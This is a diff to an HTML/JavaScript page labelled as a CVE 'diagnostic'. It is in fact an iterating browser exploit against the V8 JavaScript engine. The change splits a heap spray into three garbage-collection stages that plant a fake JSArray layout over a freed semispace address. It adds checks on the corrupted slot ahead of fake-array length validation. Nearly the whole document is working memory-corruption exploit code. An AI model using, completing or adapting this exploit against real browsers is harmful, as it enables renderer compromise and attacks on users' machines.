@@ -1,7 +1,7 @@
 <!doctype html>
 <html>
   <head>
-    <title>CVE-2026-85046 - Windows controlled-reclaim diagnostic v7</title>
+    <title>CVE-2026-85046 - Windows three-stage reclaim diagnostic v8</title>
     <meta charset="UTF-8" />
     <style>
       * {
@@ -179,7 +179,7 @@
       var running = false;
 
       try {
-        var previousDiagnostic = localStorage.getItem("f022-v7-last");
+        var previousDiagnostic = localStorage.getItem("f022-v8-last");
         if (previousDiagnostic) {
           setTimeout(function () {
             log("[previous diagnostic] " + previousDiagnostic);
@@ -421,17 +421,29 @@
         // stale address's semispace becomes allocatable and gets sprayed over.
         // 64 rounds x 4 x 128KB = 32MB — enough to flip an 8MB semispace pair
         // and re-cover the dead address even at a deep offset.
-        var sprayGroups = 48; // ~24 MiB; increase only if the dump shows the stale slot was not covered.
+        // Reference exploit uses three distinct allocation phases:
+        //   stage 1 -> first post-bug Scavenge
+        //   stage 2 -> second Scavenge, stale semispace becomes active again
+        //   stage 3 -> fill that active semispace with the fake-array layout.
+        //
+        // 16 groups ~= 8 MiB per stage with these ~128 KiB backing stores.
+        // v6 showed that ~24 MiB total was enough to reach the stale address on
+        // this Canva renderer, so preserve roughly the same total pressure but
+        // keep the three GC phases separate.
+        var stageGroups = 16;
+
         try {
           localStorage.setItem(
-            "f022-v7-last",
+            "f022-v8-last",
             JSON.stringify({
               dead_addr: hex(dead_addr),
               victim: hex(victim_base),
               originalPattern: original_pattern,
               selectedPattern: pattern,
               windowsPhaseFlip: true,
-              sprayGroups: sprayGroups,
+              stageGroups: stageGroups,
+              stageApproxMiB: 8,
+              totalApproxMiB: 24,
               expectedMap: hex(PACKED_DOUBLE_MAP),
               expectedEmptyProperties: hex(EMPTY_PROPERTIES),
               expectedLengthWord: hex(FAKE_LEN_SMI),
@@ -439,8 +451,16 @@
           );
         } catch (_) {}
 
-        dbg("      [6] controlled slice spray: groups=" + sprayGroups + " (~24 MiB)...");
-        var sprayKeep = sprayControlled(victim_elems_tagged, pattern, sprayGroups);
+        dbg("      [6.1] spray stage 1: ~8 MiB...");
+        var sprayKeep1 = sprayControlled(victim_elems_tagged, pattern, stageGroups);
+
+        dbg("      [6.2] spray stage 2: ~8 MiB...");
+        sprayKeep1 = null;
+        var sprayKeep2 = sprayControlled(victim_elems_tagged, pattern, stageGroups);
+
+        dbg("      [6.3] spray stage 3: ~8 MiB...");
+        sprayKeep2 = null;
+        var sprayKeep3 = sprayControlled(victim_elems_tagged, pattern, stageGroups);
 
         // Debug pause (#auto#pause): spin so gdb can attach to the renderer and
         // dump memory around dead_addr before the deref (crashes invalidate it).
@@ -460,8 +480,32 @@
         if (master === null || master === undefined)
           throw new Error("bad[2] is empty");
 
-        if (typeof master !== "object")
-          throw new Error("bad[2] is not an object");
+        var masterType = typeof master;
+        dbg("      [7.0] typeof bad[2]=" + masterType);
+
+        if (masterType !== "object") {
+          var masterValue = "<unprintable>";
+          var staleSlotText = "<unavailable>";
+          var staleSlotAddr = "<unavailable>";
+
+          try { masterValue = String(master); } catch (_) {}
+          try {
+            staleSlotText = String(bad).split(",")[2];
+            var staleSlotNum = Number(staleSlotText);
+            if (Number.isFinite(staleSlotNum)) {
+              staleSlotAddr = hex((staleSlotNum * 2) >>> 0);
+            }
+          } catch (_) {}
+
+          dbg("      [7.0] bad[2] value=" + masterValue);
+          dbg("      [7.0] String(bad)[2]=" + staleSlotText +
+              " -> " + staleSlotAddr +
+              " expected stale=" + hex(dead_addr));
+
+          throw new Error(
+            "bad[2] is not an object (typeof=" + masterType + ")",
+          );
+        }
 
         dbg("      [7.1] attempting fake-JSArray length validation...");
         var len = master.length;
